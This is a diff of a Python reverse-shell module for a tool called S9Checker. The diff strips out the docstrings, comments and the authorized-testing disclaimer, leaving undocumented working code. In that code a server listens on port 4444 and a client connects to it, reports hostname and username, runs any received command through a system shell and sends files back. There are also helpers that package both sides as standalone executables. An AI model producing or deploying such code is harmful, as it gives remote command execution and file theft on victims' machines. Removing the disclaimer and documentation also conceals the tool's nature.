@@ -1,20 +1,3 @@
-"""
-Reverse shell system for S9Checker - Security Testing Tool.
-
-This module provides a basic reverse shell for authorized penetration testing
-and security auditing only. Use only on systems you own or have permission to test.
-
-Components:
-  - Server: Listens for connections and provides command interface
-  - Client: Connects to server and executes received commands
-
-Usage:
-  1. Run server: python reverseshell.py server --port 4444
-  2. Run client: python reverseshell.py client --host <server_ip> --port 4444
-
-DISCLAIMER: This tool is for authorized security testing only.
-Unauthorized access to computer systems is illegal.
-"""
 
 import os
 import sys
@@ -32,7 +15,6 @@ logger = logging.getLogger("S9Checker")
 
 @dataclass
 class ShellConfig:
-    """Configuration for reverse shell connection."""
     host: str = "0.0.0.0"
     port: int = 4444
     buffer_size: int = 4096
@@ -40,10 +22,6 @@ class ShellConfig:
 
 
 class ReverseShellServer:
-    """
-    Reverse shell server - listens for client connections
-    and provides an interactive command interface.
-    """
 
     def __init__(self, config: ShellConfig):
         self.config = config
@@ -54,11 +32,9 @@ class ReverseShellServer:
         self._output_callback = None
 
     def set_output_callback(self, callback):
-        """Set callback function for output (text, is_error)."""
         self._output_callback = callback
 
     def _emit(self, text: str, is_error: bool = False):
-        """Send output to callback."""
         if self._output_callback:
             self._output_callback(text, is_error)
         else:
@@ -66,7 +42,6 @@ class ReverseShellServer:
             print(f"{prefix}{text}")
 
     def start(self):
-        """Start the server and wait for connections."""
         try:
             self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -95,12 +70,10 @@ class ReverseShellServer:
             self.stop()
 
     def _handle_client(self):
-        """Handle communication with connected client."""
         self.client_socket.settimeout(1.0)
 
         while self._running and self.client_socket:
             try:
-                # Receive data from client
                 data = self.client_socket.recv(self.config.buffer_size)
                 if not data:
                     self._emit("Client disconnected")
@@ -108,7 +81,6 @@ class ReverseShellServer:
 
                 response = data.decode("utf-8", errors="replace")
 
-                # Check if it's a file transfer
                 if response.startswith("[FILE:"):
                     self._handle_file_recv(response)
                 else:
@@ -127,14 +99,11 @@ class ReverseShellServer:
         self.client_socket = None
 
     def _handle_file_recv(self, data: str):
-        """Handle file received from client."""
         try:
-            # Parse file info
             header_end = data.find("]")
             header = data[6:header_end]
             filename, size = header.split("|")
 
-            # Get file content
             content_start = header_end + 1
             content = data[content_start:]
 
@@ -146,7 +115,6 @@ class ReverseShellServer:
             self._emit(f"File receive error: {e}", is_error=True)
 
     def send_command(self, command: str) -> bool:
-        """Send a command to the connected client."""
         if not self.client_socket:
             self._emit("No client connected", is_error=True)
             return False
@@ -159,7 +127,6 @@ class ReverseShellServer:
             return False
 
     def stop(self):
-        """Stop the server."""
         self._running = False
         if self.client_socket:
             try:
@@ -175,9 +142,6 @@ class ReverseShellServer:
 
 
 class ReverseShellClient:
-    """
-    Reverse shell client - connects to server and executes commands.
-    """
 
     def __init__(self, config: ShellConfig):
         self.config = config
@@ -185,7 +149,6 @@ class ReverseShellClient:
         self._running = False
 
     def start(self):
-        """Connect to server and wait for commands."""
         try:
             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.socket.settimeout(1.0)
@@ -195,7 +158,6 @@ class ReverseShellClient:
             self._running = True
             print("Connected!")
 
-            # Send initial info
             info = {
                 "hostname": os.environ.get("COMPUTERNAME", "unknown"),
                 "username": os.environ.get("USERNAME", "unknown"),
@@ -215,7 +177,6 @@ class ReverseShellClient:
                     if not command:
                         continue
 
-                    # Handle special commands
                     if command.lower() == "exit":
                         self._running = False
                         break
@@ -234,7 +195,6 @@ class ReverseShellClient:
                         self.socket.send(os.getcwd().encode("utf-8"))
                         continue
 
-                    # Execute command
                     result = subprocess.run(
                         command,
                         shell=True,
@@ -264,7 +224,6 @@ class ReverseShellClient:
             self.stop()
 
     def stop(self):
-        """Disconnect from server."""
         self._running = False
         if self.socket:
             try:
@@ -274,11 +233,9 @@ class ReverseShellClient:
 
 
 def build_server_exe(output_name: str = "server.exe"):
-    """Build a standalone server executable."""
     code = '''import sys
 import os
 
-# Add parent directory to path
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
 from core.reverseshell import ReverseShellServer, ShellConfig
@@ -306,11 +263,9 @@ if __name__ == "__main__":
 
 
 def build_client_exe(output_name: str = "client.exe"):
-    """Build a standalone client executable."""
     code = '''import sys
 import os
 
-# Add parent directory to path
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
 from core.reverseshell import ReverseShellClient, ShellConfig
